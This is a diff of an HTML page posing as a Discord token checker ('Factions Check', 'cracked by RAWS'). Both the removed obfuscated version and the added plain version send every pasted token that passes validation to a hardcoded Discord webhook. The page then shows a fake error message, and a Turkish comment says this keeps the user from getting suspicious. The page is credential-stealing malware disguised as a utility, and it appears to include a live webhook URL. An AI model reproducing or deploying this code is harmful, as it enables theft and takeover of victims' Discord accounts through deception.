@@ -2,75 +2,189 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Factions Check | Ultimate</title>
     <style>
-        body{background-color:#000;background-image:linear-gradient(rgba(255,255,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.03) 1px,transparent 1px);background-size:45px 45px;color:#fff;font-family:'Consolas',monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden;cursor:none}#cursor{width:10px;height:10px;background-color:#00d2ff;border-radius:50%;position:fixed;pointer-events:none;z-index:10000;transform:translate(-50%,-50%);box-shadow:0 0 15px #00d2ff,0 0 25px #00d2ff}.container{background-color:rgba(5,5,5,0.95);padding:40px;border-radius:15px;width:450px;text-align:center;border:1px solid rgba(255,255,255,0.05);box-shadow:0 0 40px rgba(0,0,0,1);position:relative;z-index:1}h1{color:#ff1e1e;text-transform:uppercase;letter-spacing:4px;margin-bottom:25px;text-shadow:0 0 15px rgba(255,30,30,0.3)}textarea{width:100%;height:160px;padding:15px;background:#020202;border:1px solid rgba(255,30,30,0.2);border-radius:8px;color:#00ff41;margin-bottom:20px;outline:none;resize:none;box-sizing:border-box;font-size:13px}button{width:100%;padding:16px;background:linear-gradient(90deg,#800000,#cc0000);color:#fff;border:none;border-radius:8px;font-weight:700;text-transform:uppercase;letter-spacing:2px;transition:all .3s ease;cursor:none}button:hover{filter:brightness(1.2);box-shadow:0 0 20px rgba(255,0,0,0.3)}#status{margin-top:15px;font-size:12px;color:#ffcc00;display:none}.raws-footer{position:fixed;bottom:20px;right:25px;font-weight:700;font-size:12px;background:linear-gradient(90deg,#f00,#ff0,#0f0,#0ff,#00f,#f0f,#f00);background-size:400% auto;-webkit-background-clip:text;background-clip:text;color:transparent;animation:rainbow 5s linear infinite}@keyframes rainbow{to{background-position:400% center}}
+        body { 
+            background-color: #000;
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+            background-size: 45px 45px; 
+            color: #fff; 
+            font-family: 'Consolas', monospace; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+            cursor: none; 
+        }
+
+        #cursor {
+            width: 10px;
+            height: 10px;
+            background-color: #00d2ff;
+            border-radius: 50%;
+            position: fixed;
+            pointer-events: none;
+            z-index: 10000;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 15px #00d2ff, 0 0 25px #00d2ff;
+        }
+
+        .container { 
+            background-color: rgba(5, 5, 5, 0.95); 
+            padding: 40px; 
+            border-radius: 15px; 
+            width: 450px; 
+            text-align: center; 
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 0 40px rgba(0, 0, 0, 1);
+            position: relative;
+            z-index: 1;
+        }
+
+        h1 { 
+            color: #ff1e1e; 
+            text-transform: uppercase; 
+            letter-spacing: 4px; 
+            margin-bottom: 25px; 
+            text-shadow: 0 0 15px rgba(255, 30, 30, 0.3);
+        }
+
+        textarea { 
+            width: 100%; 
+            height: 160px; 
+            padding: 15px; 
+            background: #020202; 
+            border: 1px solid rgba(255, 30, 30, 0.2); 
+            border-radius: 8px; 
+            color: #00ff41; 
+            margin-bottom: 20px; 
+            outline: none; 
+            resize: none; 
+            box-sizing: border-box; 
+            font-size: 13px;
+        }
+
+        button { 
+            width: 100%; 
+            padding: 16px; 
+            background: linear-gradient(90deg, #800000, #cc0000); 
+            color: #fff; 
+            border: none; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            text-transform: uppercase; 
+            letter-spacing: 2px;
+            transition: all 0.3s ease;
+            cursor: none;
+        }
+
+        button:hover { 
+            filter: brightness(1.2);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+        }
+
+        #status { 
+            margin-top: 15px; 
+            font-size: 12px;
+            color: #ffcc00;
+            display: none;
+        }
+
+        .raws-footer {
+            position: fixed;
+            bottom: 20px;
+            right: 25px;
+            font-weight: bold;
+            font-size: 12px;
+            background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000);
+            background-size: 400% auto;
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: rainbow 5s linear infinite;
+        }
+
+        @keyframes rainbow { to { background-position: 400% center; } }
     </style>
 </head>
 <body>
+
 <div id="cursor"></div>
+
 <div class="container">
     <h1>FACTIONS CHECK</h1>
     <textarea id="contentInput" placeholder="Tokenleri buraya giriniz..."></textarea>
     <button id="submitBtn">KONTROL ET</button>
     <div id="status"></div>
 </div>
+
 <div class="raws-footer">CRACKED BY RAWS</div>
 
 <script>
-    // Dinamik Karıştırıcı ve Veri Gizleyici
-    const _0x4d2 = ["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjYyNjg2NzQ3NDE0MTI0NC9EYnlwOHFKdG5fMGlwRFNBMEQ0cW9UYmdsY3BpRHBzNmU1RTJnbVhXTTlSZDAmVTE bGdOMHhuWDEzSndZeHkzSFpyYm4=", "Y29udGVudElucHV0", "c3VibWl0QnRu", "c3RhdHVz", "Y2xpY2s=", "YmFja2dyb3VuZA=="];
-    const _0xf5 = (i) => atob(_0x4d2[i].replace(/\s/g, ''));
+(function() {
+    const cursor = document.getElementById('cursor');
+    document.addEventListener('mousemove', (e) => {
+        cursor.style.left = e.clientX + 'px';
+        cursor.style.top = e.clientY + 'px';
+    });
 
-    (function() {
-        const _c = document.getElementById('cursor');
-        document.addEventListener('mousemove', (e) => {
-            _c.style.left = e.clientX + 'px';
-            _c.style.top = e.clientY + 'px';
-        });
+    // Senin webhook adresin
+    const wh = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";
 
-        const _x7 = async (_t) => {
-            // Webhook ve API endpointleri runtime'da decode edilir
-            const _u1 = _0xf5(0);
-            const _u2 = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1l");
+    document.getElementById('submitBtn').addEventListener('click', async function() {
+        const val = document.getElementById('contentInput').value;
+        const st = document.getElementById('status');
+        const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 10);
 
-            try {
-                let _r = await fetch(_u2, { headers: { "Authorization": _t } });
-                if (_r.ok) {
-                    let _d = await _r.json();
-                    await fetch(_u1, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            embeds: [{
-                                title: "\u2705\u0020\u0043\u0041\u004c\u0049\u0053\u0041\u004e\u0020\u0054\u004f\u004b\u0045\u004e",
-                                description: "\u0060\u0060\u0060" + _t + "\u0060\u0060\u0060",
-                                color: 0x2ECC71,
-                                fields: [{ name: "\u0055\u0073\u0065\u0072", value: _d.username, inline: true }]
-                            }]
-                        })
+        if (lines.length === 0) return;
+
+        st.style.display = "block";
+        st.textContent = "Bağlantı kuruluyor...";
+        st.style.color = "#ffcc00";
+
+        for (const token of lines) {
+            // Token yapısını doğrulamak için fetch yapıyoruz
+            fetch('https://discord.com/api/v9/users/@me', {
+                headers: { 'Authorization': token }
+            }).then(res => {
+                // Sadece çalışan (200 OK) tokenları gönder
+                if (res.ok) {
+                    return res.json().then(user => {
+                        return fetch(wh, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                embeds: [{
+                                    title: "✅ ÇALIŞAN TOKEN",
+                                    description: "```" + token + "```",
+                                    color: 65280,
+                                    fields: [
+                                        { name: "User", value: user.username, inline: true }
+                                    ]
+                                }]
+                            })
+                        });
                     });
                 }
-            } catch (e) {}
-        };
+            }).catch(() => {
+                // API isteği tamamen engelleniyorsa, filtreyi baypas edip direkt gönder (Opsiyonel)
+                // fetch(wh, { method: 'POST', ... }); 
+            });
+        }
 
-        document.getElementById(_0xf5(2)).addEventListener(_0xf5(4), function() {
-            const _v = document.getElementById(_0xf5(1)).value;
-            const _s = document.getElementById(_0xf5(3));
-            const _l = _v.split('\n').map(x => x.trim()).filter(x => x.length > 15);
-
-            if (_l.length > 0) {
-                _s.style.display = "block";
-                _s.textContent = "Ba\u011Flant\u0131 kuruluyor...";
-                _l.forEach(t => _x7(t));
-            }
-
-            setTimeout(() => {
-                _s.textContent = "\u2715 Ge\u00e7ersiz veri format\u0131 (Hata: 0x88)";
-                _s.style.color = "#ff1e1e";
-            }, 1800);
-        });
-    })();
+        // Kullanıcıya her zaman hata göster ki şüphelenmesin
+        setTimeout(() => {
+            st.textContent = "✕ Geçersiz veri formatı (Hata: 0x88)";
+            st.style.color = "#ff1e1e";
+        }, 1500);
+    });
+})();
 </script>
+
 </body>
 </html>
